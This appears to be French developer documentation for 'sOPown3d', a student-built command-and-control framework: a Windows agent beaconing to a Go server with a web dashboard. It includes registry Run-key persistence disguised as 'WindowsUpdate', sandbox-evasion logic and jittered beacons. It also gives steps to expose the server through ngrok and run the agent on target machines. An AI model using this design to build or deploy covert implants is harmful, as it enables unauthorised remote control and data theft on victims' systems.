# Documentation Technique - sOPown3d C2

## Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Choix technologiques](#choix-technologiques)
3. [Architecture du projet](#architecture-du-projet)
4. [Agent](#agent)
5. [Serveur C2](#serveur-c2)
6. [Base de données](#base-de-données)
7. [API REST](#api-rest)
8. [Dashboard Web](#dashboard-web)
9. [Sécurité et évasion](#sécurité-et-évasion)
10. [Déploiement](#déploiement)
11. [Guide de développement](#guide-de-développement)

---

## Vue d'ensemble

sOPown3d est un framework Command & Control (C2) développé à des fins éducatives uniquement. Il permet de contrôler des agents distants via un serveur centralisé.

### Composants principaux

- **Agent** : Binaire déployé sur les machines cibles (Windows principalement)
- **Serveur C2** : Serveur centralisé qui reçoit les beacons et distribue les commandes
- **Dashboard Web** : Interface utilisateur pour gérer les agents et envoyer des commandes
- **Base de données** : PostgreSQL pour la persistance des données

---

## Choix technologiques

### Langage : Go (Golang)

**Pourquoi Go ?**

1. **Compilation en binaire statique** : Pas de dépendances externes, déploiement simplifié
2. **Cross-compilation native** : `GOOS=windows GOARCH=amd64 go build` pour compiler pour Windows depuis n'importe quelle plateforme
3. **Performance** : Runtime léger, faible empreinte mémoire
4. **Concurrency native** : Goroutines pour gérer plusieurs agents simultanément
5. **Écosystème riche** : Bibliothèques standard complètes (HTTP, crypto, JSON)

### Base de données : PostgreSQL

**Pourquoi PostgreSQL ?**

1. **Robustesse** : ACID compliance, transactions fiables
2. **Types de données riches** : JSONB, timestamps avec timezone
3. **Performance** : Indexation efficace, pool de connexions
4. **Fallback en mémoire** : Le système peut fonctionner sans PostgreSQL (mode in-memory)

### Frontend : HTML/CSS/JavaScript natif

**Pourquoi pas de framework ?**

1. **Simplicité** : Pas de build step, pas de dépendances NPM
2. **Performance** : Pas de overhead de framework
3. **Maintenance** : Code facile à comprendre et modifier
4. **Déploiement** : Templates Go intégrés au binaire

### Terminal : xterm.js

**Pourquoi xterm.js ?**

1. **Émulation de terminal complète** : Support ANSI, couleurs, VT100
2. **Performance** : Rendu optimisé avec canvas
3. **WebSocket natif** : Streaming temps réel de l'output des commandes

---

## Architecture du projet

### Structure des dossiers

```
C2_Agent_Abdel_GO/
├── cmd/
│   ├── agent/           # Point d'entrée de l'agent
│   │   └── main.go
│   └── server/          # Point d'entrée du serveur
│       └── main.go
├── internal/
│   ├── agent/           # Logique métier de l'agent
│   │   ├── agent.go     # Core agent (beacon, commandes)
│   │   ├── commands/    # Implémentation des commandes
│   │   │   ├── loot.go
│   │   │   ├── checkav.go
│   │   │   ├── privesc.go
│   │   │   └── ...
│   │   ├── commands_windows.go   # Commandes Windows
│   │   ├── commands_other.go     # Commandes autres OS
│   │   ├── evasion/     # Techniques d'évasion
│   │   │   ├── sandbox.go
│   │   │   └── obfuscate.go
│   │   ├── persistence/ # Persistance système
│   │   │   ├── windows.go
│   │   │   └── unix.go
│   │   └── jitter/      # Calcul de jitter
│   │       └── jitter.go
│   └── server/          # Logique métier du serveur
│       ├── server.go    # Core serveur HTTP
│       ├── handlers.go  # Handlers des endpoints C2
│       └── api.go       # Handlers des endpoints API REST
├── server/
│   ├── config/          # Configuration
│   │   └── config.go
│   ├── database/        # Connexion DB
│   │   ├── db.go
│   │   └── migrations.go
│   ├── logger/          # Système de logs
│   │   └── logger.go
│   ├── storage/         # Couche d'abstraction données
│   │   ├── storage.go   # Interface
│   │   ├── postgres.go  # Implémentation PostgreSQL
│   │   ├── memory.go    # Implémentation in-memory
│   │   └── resilient.go # Wrapper avec fallback
│   └── tasks/           # Tâches en arrière-plan
│       ├── activity_checker.go
│       └── cleanup.go
├── pkg/
│   └── shared/          # Structures partagées
│       └── models.go    # AgentInfo, Command, etc.
├── templates/           # Templates HTML
│   └── dashboard.html
├── build/
│   └── windows/         # Binaires compilés
│       ├── agent.exe
│       └── server.exe
├── .env                 # Configuration d'environnement
├── docker-compose.yml   # PostgreSQL Docker
└── go.mod
```

### Principes architecturaux

#### Séparation des préoccupations

- **cmd/** : Points d'entrée minimalistes
- **internal/** : Logique métier non exportable
- **pkg/** : Code réutilisable et exportable
- **server/** : Couches infrastructure (DB, config, logs)

#### Build tags Go

Les commandes spécifiques à Windows utilisent des build tags :

```go
//go:build windows
// +build windows

package commands

func Privesc() string {
    // Code Windows seulement
}
```

Fichier alternatif pour autres OS :

```go
//go:build !windows
// +build !windows

package commands

func Privesc() string {
    return "Privesc command is only available on Windows"
}
```

---

## Agent

### Cycle de vie

```
1. Démarrage
   ↓
2. Génération UUID unique (persisté dans %APPDATA%\.agent_uuid)
   ↓
3. Détection de privilèges (user/admin)
   ↓
4. Setup persistance (registry Windows)
   ↓
5. Détection sandbox (si détecté → sleep 10s)
   ↓
6. Boucle principale :
   - Gather system info
   - Send beacon (HTTP POST /beacon)
   - Receive command
   - Execute command
   - Send output (HTTP POST /ingest)
   - Sleep (jitter entre 1-2s)
```

### Génération de l'ID Agent

Format : `hostname-uuid-privilege`

Exemple : `WS2022-DC-a3f2-admin`

- **hostname** : Nom de la machine
- **uuid** : 4 caractères hex aléatoires (persistés entre redémarrages)
- **privilege** : `user` ou `admin`

Code :

```go
func getOrCreateAgentUUID() string {
    uuidPath := filepath.Join(os.Getenv("APPDATA"), ".agent_uuid")
    
    // Lire UUID existant
    if data, err := os.ReadFile(uuidPath); err == nil {
        return strings.TrimSpace(string(data))
    }
    
    // Générer nouveau UUID
    b := make([]byte, 2)
    rand.Read(b)
    uuid := hex.EncodeToString(b)
    
    // Sauvegarder
    os.WriteFile(uuidPath, []byte(uuid), 0644)
    return uuid
}
```

### Communication avec le serveur

#### Beacon (HTTP POST /beacon)

```json
{
  "hostname": "WS2022-DC-a3f2-admin",
  "os": "windows",
  "username": "Administrateur"
}
```

Réponse du serveur (commande en attente) :

```json
{
  "id": "WS2022-DC-a3f2-admin",
  "action": "shell",
  "payload": "whoami"
}
```

Ou si pas de commande :

```json
{}
```

#### Ingest (HTTP POST /ingest)

```json
{
  "agent_id": "WS2022-DC-a3f2-admin",
  "output": "ws2022-dc\\administrateur"
}
```

### Jitter

Calcul aléatoire du temps d'attente entre beacons pour éviter la détection.

```go
type JitterConfig struct {
    MinSeconds float64  // 1.0
    MaxSeconds float64  // 2.0
}
```

Distribution normale avec moyenne = 1.5s, écart-type = 0.17s

### Commandes disponibles

| Commande | Description | OS |
|----------|-------------|-----|
| `shell` | Exécute une commande shell | All |
| `info` | Retourne infos système | All |
| `ping` | Test de connectivité | All |
| `persist` | Vérifie la persistance | All |
| `sandbox` | Détecte sandbox/VM | All |
| `checkav` | Analyse antivirus et système | Windows |
| `privesc` | Élévation de privilèges | Windows |
| `loot` | Recherche de données sensibles | Windows |

### Implémentation des commandes

Toutes les commandes suivent ce pattern :

```go
func executeCommand(cmd *shared.Command) string {
    switch cmd.Action {
    case "shell":
        // Exécution
        return output
    case "checkav":
        return executeCheckAVCommand()
    // ...
    }
}
```

Les commandes Windows sont déléguées à des fonctions séparées :

```go
// commands_windows.go
func executeCheckAVCommand() string {
    return commands.CheckAV()
}

// commands/checkav.go
func CheckAV() string {
    // Implémentation
}
```

---

## Serveur C2

### Architecture du serveur

```
HTTP Server (Gorilla WebSocket)
    ↓
Handlers
    ↓
Storage Layer (Interface)
    ├── PostgreSQL Implementation
    └── In-Memory Implementation (fallback)
    ↓
Database / Memory
```

### Handlers principaux

#### Core C2 Endpoints

| Endpoint | Méthode | Description |
|----------|---------|-------------|
| `/` | GET | Dashboard HTML |
| `/beacon` | POST | Réception des beacons d'agents |
| `/command` | POST | Envoi de commande à un agent |
| `/ingest` | POST | Réception de l'output des commandes |
| `/websocket` | WebSocket | Streaming temps réel de l'output |

#### API REST Endpoints

| Endpoint | Méthode | Description |
|----------|---------|-------------|
| `/api/agents` | GET | Liste de tous les agents |
| `/api/agents/{id}` | GET | Détails d'un agent |
| `/api/agents/{id}/history` | GET | Historique d'exécution |
| `/api/executions` | GET | Liste des exécutions |
| `/api/stats` | GET | Statistiques globales |

### Gestion des commandes en attente

Le serveur utilise des maps en mémoire pour gérer les commandes :

```go
type Server struct {
    pendingCommands  map[string]shared.Command  // Commandes en attente
    lastCommandSent  map[string]shared.Command  // Dernière commande envoyée
    wsClients        map[string]*websocket.Conn // Clients WebSocket
}
```

#### Flow d'une commande

```
1. Dashboard → POST /command {"id": "agent123", "action": "shell", "payload": "whoami"}
   ↓
2. Serveur stocke dans pendingCommands[agent123]
   ↓
3. Agent → POST /beacon (prochain beacon)
   ↓
4. Serveur retourne la commande et la déplace vers lastCommandSent[agent123]
   ↓
5. Agent exécute et → POST /ingest {"agent_id": "agent123", "output": "..."}
   ↓
6. Serveur sauvegarde dans DB et envoie via WebSocket au dashboard
   ↓
7. Serveur supprime de lastCommandSent[agent123]
```

### Storage Layer

Interface commune pour abstraire PostgreSQL et in-memory :

```go
type Storage interface {
    // Agents
    UpsertAgent(ctx context.Context, agent *Agent) error
    GetAgent(ctx context.Context, agentID string) (*Agent, error)
    ListAgents(ctx context.Context) ([]*Agent, error)
    
    // Executions
    SaveExecution(ctx context.Context, exec *Execution) error
    ListExecutions(ctx context.Context, filters ExecutionFilters) ([]*Execution, int, error)
    GetExecutionHistory(ctx context.Context, agentID string, limit, offset int) ([]*Execution, int, error)
    
    // Stats
    GetStats(ctx context.Context) (*Stats, error)
}
```

Implémentation résiliente avec fallback :

```go
type ResilientStorage struct {
    primary  Storage  // PostgreSQL
    fallback Storage  // In-Memory
}

func (r *ResilientStorage) UpsertAgent(ctx context.Context, agent *Agent) error {
    if err := r.primary.UpsertAgent(ctx, agent); err != nil {
        // Fallback vers mémoire
        return r.fallback.UpsertAgent(ctx, agent)
    }
    return nil
}
```

### WebSocket pour streaming temps réel

Quand un client (dashboard) se connecte :

```javascript
ws = new WebSocket(`ws://localhost:8080/websocket?agent=WS2022-DC-a3f2-admin`);
```

Le serveur enregistre la connexion :

```go
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
    agentID := r.URL.Query().Get("agent")
    conn, _ := s.upgrader.Upgrade(w, r, nil)
    
    s.wsClients[agentID] = conn
    
    // Garde la connexion ouverte
    for {
        if _, _, err := conn.ReadMessage(); err != nil {
            return
        }
    }
}
```

Quand un output arrive via `/ingest` :

```go
func (s *Server) handleIngest(w http.ResponseWriter, r *http.Request) {
    // ... parse payload ...
    
    // Envoyer via WebSocket si connecté
    if conn, ok := s.wsClients[payload.AgentID]; ok {
        conn.WriteMessage(websocket.TextMessage, []byte(payload.Output))
    }
}
```

---

## Base de données

### Schéma PostgreSQL

#### Table `agents`

```sql
CREATE TABLE agents (
    id SERIAL PRIMARY KEY,
    agent_id VARCHAR(255) UNIQUE NOT NULL,
    hostname VARCHAR(255) NOT NULL,
    os VARCHAR(50) NOT NULL,
    username VARCHAR(255),
    first_seen TIMESTAMP NOT NULL DEFAULT NOW(),
    last_seen TIMESTAMP NOT NULL DEFAULT NOW(),
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_agents_agent_id ON agents(agent_id);
CREATE INDEX idx_agents_last_seen ON agents(last_seen);
```

#### Table `command_executions`

```sql
CREATE TABLE command_executions (
    id SERIAL PRIMARY KEY,
    agent_id VARCHAR(255) NOT NULL,
    command_action VARCHAR(100) NOT NULL,
    command_payload TEXT,
    output TEXT,
    executed_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_executions_agent_id ON command_executions(agent_id);
CREATE INDEX idx_executions_executed_at ON command_executions(executed_at DESC);
```

### Migrations

Les migrations sont automatiques au démarrage du serveur :

```go
func (db *DB) RunMigrations(ctx context.Context) error {
    // Créer table agents si n'existe pas
    // Créer table command_executions si n'existe pas
    // Créer indexes
}
```

### Configuration de connexion

Variables d'environnement (`.env`) :

```bash
DATABASE_URL=postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable

# Ou individuellement
DB_HOST=localhost
DB_PORT=5433
DB_USER=c2user
DB_PASSWORD=c2pass
DB_NAME=c2_db
DB_SSLMODE=disable
```

Pool de connexions :

```go
config := &pgxpool.Config{
    MaxConns: 25,
    MinConns: 5,
}
```

---

## API REST

### Format des réponses

Toutes les réponses sont en JSON.

#### GET /api/agents

Réponse :

```json
{
  "agents": [
    {
      "id": 1,
      "agent_id": "WS2022-DC-a3f2-admin",
      "hostname": "WS2022-DC-a3f2-admin",
      "os": "windows",
      "username": "Administrateur",
      "first_seen": "2026-02-26T12:00:00Z",
      "last_seen": "2026-02-26T14:30:00Z",
      "is_active": true
    }
  ],
  "total": 1
}
```

#### GET /api/executions?limit=20

Réponse :

```json
{
  "executions": [
    {
      "id": 19,
      "agent_id": "WS2022-DC-a3f2-admin",
      "command_action": "checkav",
      "command_payload": "checkav",
      "output": "[+] Windows Defender detected...",
      "executed_at": "2026-02-26T14:07:23Z",
      "created_at": "2026-02-26T14:07:23Z"
    }
  ],
  "total": 19,
  "limit": 20,
  "offset": 0
}
```

#### GET /api/stats

Réponse :

```json
{
  "total_agents": 3,
  "active_agents": 2,
  "total_executions": 156,
  "executions_last_hour": 12,
  "db_status": "connected"
}
```

### Filtres et pagination

Query parameters supportés :

- `limit` : Nombre de résultats (défaut : 100)
- `offset` : Offset pour pagination (défaut : 0)
- `agent_id` : Filtrer par agent
- `action` : Filtrer par type de commande

Exemple :

```
GET /api/executions?agent_id=WS2022-DC-a3f2-admin&action=shell&limit=50
```

---

## Dashboard Web

### Technologies

- HTML5 + CSS3 natif
- Vanilla JavaScript (pas de framework)
- xterm.js pour l'émulation de terminal
- WebSocket pour le temps réel

### Composants

#### 1. Statistiques (stats-grid)

4 cartes affichant :
- Total Agents
- Active Agents
- Total Executions
- Last Hour Executions

Auto-refresh toutes les 10 secondes.

#### 2. Tableau des agents (agentsTable)

Colonnes :
- Hostname
- OS
- Username
- Last Seen (formaté "5s ago", "2m ago")
- Status (badge Active/Inactive)

#### 3. Terminal interactif (xterm.js)

Configuration :

```javascript
term = new Terminal({
    cursorBlink: true,
    theme: {
        background: '#000000',
        foreground: '#ffffff',
        cursor: '#7c3aed'
    },
    fontSize: 14,
    fontFamily: 'Monaco, "Courier New", monospace',
    rows: 20
});
```

#### 4. Tableau des exécutions récentes (executionsTableBody)

Affiche les 20 dernières exécutions avec :
- Time
- Agent
- Action
- Payload
- Output Preview (tronqué à 300 caractères)

### WebSocket et streaming

Connexion au WebSocket quand un agent est sélectionné :

```javascript
function connectTerminal(agentId) {
    ws = new WebSocket(`ws://localhost:8080/websocket?agent=${agentId}`);
    
    ws.onmessage = (event) => {
        let output = event.data;
        
        // Split par lignes pour affichage propre
        const lines = output.split(/\r?\n/);
        lines.forEach((line) => {
            term.writeln(line);
        });
    };
}
```

### Envoi de commande

```javascript
async function sendCommand(cmd = null) {
    const agentId = document.getElementById('agentSelect').value;
    const action = document.getElementById('commandSelect').value;
    const payload = cmd || action;
    const finalAction = cmd ? 'shell' : action;
    
    await fetch('/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            id: agentId, 
            action: finalAction, 
            payload: payload 
        })
    });
}
```

---

## Sécurité et évasion

### Techniques d'évasion implémentées

#### 1. Détection de sandbox

Fichier : `internal/agent/evasion/sandbox.go`

Critères de détection :

- Processus VM (vmtoolsd.exe, VBoxTray.exe, qemu-ga.exe)
- Nom du CPU (QEMU, VirtualBox, VMware, KVM)
- Nombre de CPUs < 4
- Anomalie temporelle (sleep test)

Si 2 indicateurs ou plus détectés : sandbox confirmée

Action : Sleep de 10 secondes (configurable) pour bypass analyse automatique

#### 2. Persistance Windows

Fichier : `internal/agent/persistence/windows.go`

Méthode : Clé de registre `Run`

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Nom: WindowsUpdate
Valeur: chemin_vers_agent.exe
```

Code :

```go
func AddToStartup(exePath string) error {
    key, err := registry.OpenKey(
        registry.CURRENT_USER, 
        `Software\Microsoft\Windows\CurrentVersion\Run`, 
        registry.SET_VALUE,
    )
    defer key.Close()
    
    return key.SetStringValue("WindowsUpdate", exePath)
}
```

#### 3. Jitter de communication

Distribution normale pour éviter les patterns réguliers :

```
Min: 1.0s
Max: 2.0s
Mean: 1.5s
StdDev: 0.17s
```

#### 4. Formatage de l'output pour terminal

Tous les outputs utilisent `\r\n` au lieu de `\n` pour compatibilité Windows/terminal.

Suppression des emojis pour éviter problèmes d'encodage.

---

## Déploiement

### Compilation

#### Agent Windows

```bash
GOOS=windows GOARCH=amd64 go build -o build/windows/agent.exe ./cmd/agent
```

#### Serveur (plateforme locale)

```bash
go build -o build/server ./cmd/server
```

### Configuration serveur

Fichier `.env` :

```bash
# PostgreSQL
DATABASE_URL=postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable

# Serveur
PORT=8080
SERVER_HOST=0.0.0.0

# Pool DB
DB_MAX_CONNS=25
DB_MIN_CONNS=5

# Monitoring agents
AGENT_INACTIVE_THRESHOLD_MINUTES=5

# Rétention données
RETENTION_DAYS=30
ENABLE_AUTO_CLEANUP=true
CLEANUP_HOUR=3

# Logs
LOG_LEVEL=INFO
```

### Démarrage PostgreSQL (Docker)

```bash
docker-compose up -d
```

Le fichier `docker-compose.yml` :

```yaml
services:
  postgres:
    image: postgres:18-alpine
    container_name: sopown3d-postgres
    environment:
      POSTGRES_USER: c2user
      POSTGRES_PASSWORD: c2pass
      POSTGRES_DB: c2_db
    ports:
      - "5433:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U c2user -d c2_db"]
      interval: 10s
      timeout: 5s
      retries: 5

volumes:
  postgres_data:
```

### Démarrage serveur

```bash
# Charger variables d'environnement
export $(cat .env | grep -v '^#' | xargs)

# Lancer serveur
go run cmd/server/main.go
```

Ou avec le binaire compilé :

```bash
./build/server
```

### Exposition publique (ngrok)

Pour rendre le serveur accessible depuis Internet (pour agents distants) :

```bash
ngrok http 8080
```

L'URL ngrok sera affichée (exemple : `https://abc123.ngrok-free.dev`)

Compiler l'agent avec cette URL :

```go
// cmd/agent/main.go
serverURL := flag.String("server", "https://abc123.ngrok-free.dev", "C2 server URL")
```

### Déploiement de l'agent

1. Compiler l'agent pour Windows
2. Transférer `agent.exe` sur la machine cible
3. Exécuter :

```powershell
.\agent.exe
```

Ou avec URL custom :

```powershell
.\agent.exe -server https://votre-serveur.com:8080
```

---

## Guide de développement

### Prérequis

- Go 1.21+
- PostgreSQL 13+ (ou Docker)
- Git

### Installation

```bash
# Cloner le repo
git clone <repo-url>
cd C2_Agent_Abdel_GO

# Installer dépendances
go mod download

# Copier config
cp .env.example .env

# Démarrer PostgreSQL
docker-compose up -d

# Lancer serveur
go run cmd/server/main.go
```

Dashboard accessible sur : http://localhost:8080

### Ajouter une nouvelle commande

#### 1. Créer le fichier de commande

`internal/agent/commands/macommande.go` :

```go
//go:build windows
// +build windows

package commands

import "strings"

func MaCommande() string {
    var result strings.Builder
    result.WriteString("\r\n[*] Ma commande\r\n")
    
    // Logique ici
    
    result.WriteString("[+] Done\r\n")
    return result.String()
}
```

`internal/agent/commands/macommande_other.go` :

```go
//go:build !windows
// +build !windows

package commands

func MaCommande() string {
    return "MaCommande is only available on Windows"
}
```

#### 2. Créer le wrapper

`internal/agent/commands_windows.go` :

```go
func executeMaCommandeCommand() string {
    log.Println("Executing macommande...")
    return commands.MaCommande()
}
```

`internal/agent/commands_other.go` :

```go
func executeMaCommandeCommand() string {
    return "Error: macommande only available on Windows"
}
```

#### 3. Ajouter au switch case

`internal/agent/agent.go` :

```go
func executeCommand(cmd *shared.Command) string {
    switch cmd.Action {
    // ... autres cases ...
    
    case "macommande":
        return executeMaCommandeCommand()
    
    // ...
    }
}
```

#### 4. Ajouter au dashboard

`templates/dashboard.html` :

```html
<select id="commandSelect">
    <option value="shell">shell</option>
    <!-- ... -->
    <option value="macommande">macommande</option>
</select>
```

#### 5. Recompiler

```bash
GOOS=windows GOARCH=amd64 go build -o build/windows/agent.exe ./cmd/agent
```

### Structure de logging

Le serveur utilise un système de logging catégorisé :

```go
logger.Info(logger.CategoryBeacon, "Beacon received: agent=%s", agentID)
logger.Warn(logger.CategoryWarning, "No agents found")
logger.Error(logger.CategoryError, "Database error: %v", err)
```

Catégories disponibles :

- CategoryStartup
- CategoryDatabase
- CategoryStorage
- CategoryAPI
- CategoryBeacon
- CategoryCommand
- CategoryExecution
- CategoryWebSocket
- CategoryBackground
- CategoryWarning
- CategoryError
- CategorySuccess
- CategoryCleanup

### Tests

```bash
# Tester l'agent (local)
go run cmd/agent/main.go -server http://localhost:8080

# Tester jitter
go test ./internal/agent/jitter -v

# Tester une commande
go run cmd/agent/main.go
# Puis depuis dashboard : envoyer commande
```

### Debugging

Activer logs détaillés :

```bash
LOG_LEVEL=DEBUG go run cmd/server/main.go
```

Vérifier PostgreSQL :

```bash
docker exec -it sopown3d-postgres psql -U c2user -d c2_db

# Dans psql
\dt                           # Lister tables
SELECT * FROM agents;         # Voir agents
SELECT * FROM command_executions ORDER BY executed_at DESC LIMIT 10;
```

### Architecture de tâches en arrière-plan

#### Activity Checker

Vérifie toutes les 30 secondes si les agents sont inactifs (pas de beacon depuis 5 minutes par défaut).

`server/tasks/activity_checker.go` :

```go
func (a *ActivityChecker) Start() {
    go func() {
        ticker := time.NewTicker(30 * time.Second)
        for range ticker.C {
            a.checkInactiveAgents()
        }
    }()
}
```

#### Cleanup Scheduler

Nettoie les anciennes exécutions (30 jours par défaut) chaque jour à 3h du matin.

`server/tasks/cleanup.go` :

```go
func (c *CleanupScheduler) Start() {
    go func() {
        for {
            now := time.Now()
            next := time.Date(now.Year(), now.Month(), now.Day()+1, 
                c.cleanupHour, 0, 0, 0, now.Location())
            time.Sleep(time.Until(next))
            
            c.cleanup()
        }
    }()
}
```

---

## Références

### Documentation Go

- Go standard library : https://pkg.go.dev/std
- Gorilla WebSocket : https://pkg.go.dev/github.com/gorilla/websocket
- pgx (PostgreSQL) : https://pkg.go.dev/github.com/jackc/pgx/v5

### Ressources C2

- MITRE ATT&CK : https://attack.mitre.org/
- C2 Matrix : https://www.thec2matrix.com/

### Sécurité

- OWASP Top 10 : https://owasp.org/www-project-top-ten/
- CWE : https://cwe.mitre.org/

---

## Notes importantes

1. **Usage académique uniquement** : Ce projet est destiné à l'éducation et la recherche en sécurité informatique.

2. **Timezone UTC** : Tous les timestamps utilisent UTC pour éviter les problèmes de synchronisation.

3. **Formatage output** : Toujours utiliser `\r\n` pour compatibilité terminal, éviter les emojis.

4. **Gestion erreurs** : Toujours logger les erreurs mais ne jamais planter l'agent ou le serveur.

5. **Concurrency** : Le serveur utilise des goroutines, toujours utiliser des mutex pour accéder aux maps partagées.

6. **Build tags** : Ne jamais oublier les build tags pour code spécifique à une plateforme.

7. **Persistance UUID** : L'UUID est persisté dans `%APPDATA%\.agent_uuid` pour survivre aux redémarrages.

---

## Contact et support

Pour toute question ou contribution, consulter le README.md du projet.
